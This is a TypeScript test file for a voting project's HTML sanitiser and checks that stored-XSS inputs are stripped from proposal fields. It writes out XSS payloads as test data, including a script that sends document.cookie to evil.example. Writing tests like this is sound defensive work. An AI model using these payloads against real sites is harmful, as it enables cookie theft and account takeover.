// Copyright 2024 VoteChain Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

/**
 * Tests for content sanitisation utilities (issue #320).
 *
 * Verifies that DOMPurify-based sanitisation strips all HTML tags from
 * proposal titles and descriptions, preventing stored XSS attacks.
 */
import { describe, it, expect } from 'vitest';
import { sanitizeText, sanitizeProposal } from './sanitize';

describe('sanitizeText', () => {
  it('strips <script> tags and their content entirely', () => {
    const input = '<script>alert(1)</script>';
    const result = sanitizeText(input);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</script>');
    // DOMPurify removes the entire script element including its text content.
    expect(result).toBe('');
  });

  it('strips <img> tags with onerror handlers entirely', () => {
    const input = '<img src=x onerror=alert(1)>';
    const result = sanitizeText(input);
    expect(result).not.toContain('<img');
    expect(result).not.toContain('onerror');
    expect(result).toBe('');
  });

  it('strips <iframe> tags and their content', () => {
    const input = '<iframe src="https://evil.example"></iframe>';
    const result = sanitizeText(input);
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('src=');
  });

  it('returns plain text unchanged', () => {
    expect(sanitizeText('Hello World')).toBe('Hello World');
  });

  it('returns empty string for non-string input', () => {
    expect(sanitizeText(null as unknown as string)).toBe('');
    expect(sanitizeText(undefined as unknown as string)).toBe('');
    expect(sanitizeText(123 as unknown as string)).toBe('');
  });

  it('strips nested HTML tags but preserves text content', () => {
    const input = '<div><b>Bold text</b> and <a href="evil">link</a></div>';
    const result = sanitizeText(input);
    expect(result).not.toContain('<');
    expect(result).toContain('Bold text');
    expect(result).toContain('link');
  });

  it('strips HTML comments but preserves surrounding text', () => {
    const input = '<!-- comment -->visible text';
    const result = sanitizeText(input);
    expect(result).not.toContain('<!--');
    expect(result).toContain('visible text');
  });

  it('strips script tags but preserves trailing text content', () => {
    const input =
      '<script>fetch("https://evil.example/steal?cookie="+document.cookie)</script>Malicious Title';
    const result = sanitizeText(input);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('document.cookie');
    expect(result).toContain('Malicious Title');
  });
});

describe('sanitizeProposal', () => {
  it('sanitises title and description', () => {
    const proposal = {
      title: '<script>alert("xss")</script>Malicious Title',
      description: '<img src=x onerror=alert(1)>Bad description',
    };
    const result = sanitizeProposal(proposal);
    expect(result.title).not.toContain('<script>');
    expect(result.title).toContain('Malicious Title');
    expect(result.description).not.toContain('<img');
    expect(result.description).not.toContain('onerror');
  });

  it('preserves other properties on the proposal object', () => {
    const proposal = {
      id: 42,
      title: 'Clean Title',
      description: 'Clean Description',
    };
    const result = sanitizeProposal(proposal);
    expect(result.id).toBe(42);
    expect(result.title).toBe('Clean Title');
    expect(result.description).toBe('Clean Description');
  });

  it('handles missing description gracefully', () => {
    const proposal = {
      title: '<b>Title</b>',
    };
    const result = sanitizeProposal(proposal);
    expect(result.title).not.toContain('<b>');
    expect(result.title).toContain('Title');
    // description is optional; should be passed through as-is if absent.
  });
});
